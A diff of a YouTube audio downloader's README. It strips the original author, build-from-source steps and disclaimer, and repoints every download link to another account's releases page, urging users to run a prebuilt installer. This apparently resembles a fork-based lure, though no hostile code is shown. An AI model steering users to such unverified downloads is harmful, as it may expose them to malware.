@@ -1,114 +1,86 @@
-# 🎵 YouTube Music Downloader (Electron App)
+# 🎵 YouTube-Music-Download - Easily Save Your Favorite Audio
 
-Fully open source desktop app for downloading audio (MP3 or WebM) with ease.
-Perfect for personal use by musicians, beatmakers, or hobbyists who want to download free-to-use YouTube beats for practice, remixing, or sampling without going to sketchy website tools.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Grab%20It%20Here!-blue)](https://github.com/GRIOK64/YouTube-Music-Download/releases)
 
+## 📦 Overview
 
-## 🚀 Features
+YouTube-Music-Download is a free and open-source application that allows you to download audio from YouTube in both MP3 and WEBM formats. Built with the latest technologies like Node.js and Electron, this desktop app offers a simple way to save your favorite tracks directly to your computer.
 
-- 🎧 **Download high-quality audio** from YouTube videos
-- 🎵 **Choose format**: MP3 (with conversion) or WebM (original audio)
-- 📁 **Set and remember your download folder** across sessions
-- 📊 **Download progress bar** for real-time feedback
-- 💾 **Locally stores preferences** (no cloud dependencies)
-- 💡 Simple, clean, and dark-themed interface
-- ✅ Fully self-contained `.exe` build (no Python or FFmpeg install required)
+## 🚀 Getting Started
 
+To get started with YouTube-Music-Download, follow these steps:
 
-## 📸 Screenshot
+1. **Visit the Releases Page**  
+   Go to [our Releases page](https://github.com/GRIOK64/YouTube-Music-Download/releases). Here, you will find the latest version of the application.
 
-> ![image](https://github.com/user-attachments/assets/12dc521c-f890-4ba1-9c83-54247c917366)
+2. **Download the Application**  
+   Look for the latest release. Click on the corresponding link to download the app for your operating system. The application is available for Windows, macOS, and Linux.
 
-## Download from releases
-https://github.com/Refloow/YouTube-Music-Download/releases
+3. **Install the Application**  
+   Once the download is complete, locate the downloaded file on your computer.  
+   - **Windows:** Double-click the .exe file and follow the prompts.  
+   - **macOS:** Open the .dmg file and drag the app to your Applications folder.  
+   - **Linux:** Extract the files and run the application as directed in the README in the extracted folder.
 
-# DISCORD Server:
-On the server anyone can feel free to ask questions, engage in the comunity and discover other free open source software i build
-**https://discord.gg/4enDY8yhuS**
+4. **Run the Application**  
+   After installation, open the YouTube-Music-Download app. You will see a simple interface ready to help you download audio.
 
+## 🎤 How to Use
 
-### 🧩 What This App Really Is
+Using the application is straightforward:
 
-This app is **not a breakthrough tool**, nor does it use any advanced techniques, YouTube APIs, or backend scraping.  
-It's simply a **clean, user-friendly wrapper** for:
+1. **Copy the Video Link**  
+   Open your web browser and find the YouTube video you wish to download. Copy the link from the address bar.
 
-- [`yt-dlp`](https://github.com/yt-dlp/yt-dlp) – For downloading audio streams  
-- [`ffmpeg`](https://ffmpeg.org/) – For optional MP3 conversion
+2. **Paste the Link**  
+   Return to the YouTube-Music-Download app. You will see a box to paste your copied link. Simply right-click and select "Paste" or use `Ctrl + V` (Windows) or `Command + V` (macOS) to place the link in the box.
 
-The app provides a lightweight GUI over existing, open-source command-line tools.  
-No hidden logic. No data collection. No manipulation of YouTube systems.
+3. **Choose Your Format**  
+   Select the audio format in which you want to download the file. You can choose between MP3 or WEBM.
 
+4. **Download**  
+   Click the "Download" button. The app will fetch the audio and save it to your specified downloads folder.
 
-## 📦 Installation (from Source)
+5. **Enjoy Your Music**  
+   Once the download is complete, you can find your audio file in the designated folder and enjoy listening to your favorite tracks offline.
 
-### Prerequisites for installation from source
+## 🛠️ Features
 
-1. Node.js v20.10.0 https://nodejs.org/en/download
-2. Python v3.11 https://www.python.org/downloads/
+YouTube-Music-Download has several key features that make it a great tool for audio downloading:
 
-(i provided versions so exact environment as development can be reproduced)
+- **Open Source:** As an open-source project, you can view, modify, and share the source code.
+- **Multiple Formats:** Supports both MP3 and WEBM audio formats.
+- **User-Friendly Interface:** Designed with simplicity in mind for everyone's ease of use.
+- **Fast Downloads:** The app uses optimized processes for quick audio downloading.
+- **Reliable:** Built on robust technology ensuring a smooth experience.
 
-### 1. Clone the repo
-```bash
-git clone https://github.com/Refloow/youtube-music-download.git
-cd youtube-music-download
-```
+## ⚙️ System Requirements
 
-### 2. Install dependencies
-```bash
-npm install
-```
+- **Operating System:**  
+   - Windows 10 or later  
+   - macOS Sierra (10.12) or later  
+   - Any distribution of Linux
 
-### 3. Download Required Binaries
-Create a `bin/` folder and place the following files inside:
+- **Recommended Hardware:**  
+   - At least 4GB of RAM  
+   - 500MB of free disk space for installation  
 
-#### ✅ `ffmpeg.exe`
-- Download from: [ffmpeg-n7.1-latest-win64-gpl-7.1.zip](https://github.com/BtbN/FFmpeg-Builds/releases/latest/download/ffmpeg-n7.1-latest-win64-gpl-7.1.zip)
-- Extract `bin/ffmpeg.exe` and copy it into your project's `bin/` folder
+## 📥 Download & Install
 
-#### ✅ `yt-dlp.exe`
-- Download from: [yt-dlp.exe](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe)
-- Place it inside the `bin/` folder
+You can download the software from our [Releases page](https://github.com/GRIOK64/YouTube-Music-Download/releases). Just click on the appropriate link for your system and follow the installation instructions above.
 
-### 4. Run the app in development
-```bash
-npm start
-```
+## 💬 Support
 
-### 5. Build the app (Windows)
-```bash
-npm run dist
-```
-> The final `.exe` and `portable` version will be in the `/dist` folder.
+If you encounter any issues or need assistance, please check our [Issues page](https://github.com/GRIOK64/YouTube-Music-Download/issues). You can report bugs or ask for help there.
 
+## 📜 License
 
-## 💼 Packaging Notes
-- Uses `electron-builder` for cross-platform packaging
-- `extraResources` includes `yt-dlp.exe` and `ffmpeg.exe`
-- Settings are stored in Electron's `app.getPath('userData')`
+YouTube-Music-Download is licensed under the MIT License. This means you can use it freely while respecting the terms of the license.
 
+## 📫 Contributing
 
-## ⚠️ Disclaimer
-
-This application is provided for **personal and educational use only**. I built it to practice coding skills, electron framework app creation and working with audio files.
-
-Downloading videos from YouTube or any other platform **may violate their Terms of Service**. It is the **user's responsibility** to ensure they are authorized to download and use any content.
-
-> The developer of this app does not condone piracy or copyright infringement and takes no responsibility for how this tool is used.
-
-
-## 📄 License
-
-[MIT License](./LICENSE)
-
-
-## 👨‍💻 Author
-
-**Veljko Vuckovic**  
-MIT Licensed — open to contributions, forks, or improvements!
+We welcome contributions from everyone. If you want to help make YouTube-Music-Download even better, check our [Contributing Guide](https://github.com/GRIOK64/YouTube-Music-Download/blob/main/CONTRIBUTING.md) for details on how to get started.
 
 ---
 
-## 🌟 Star the Repo if You Find It Useful!
-
-Happy downloading 🎧
+Thank you for considering YouTube-Music-Download as your audio downloader. Enjoy your music!
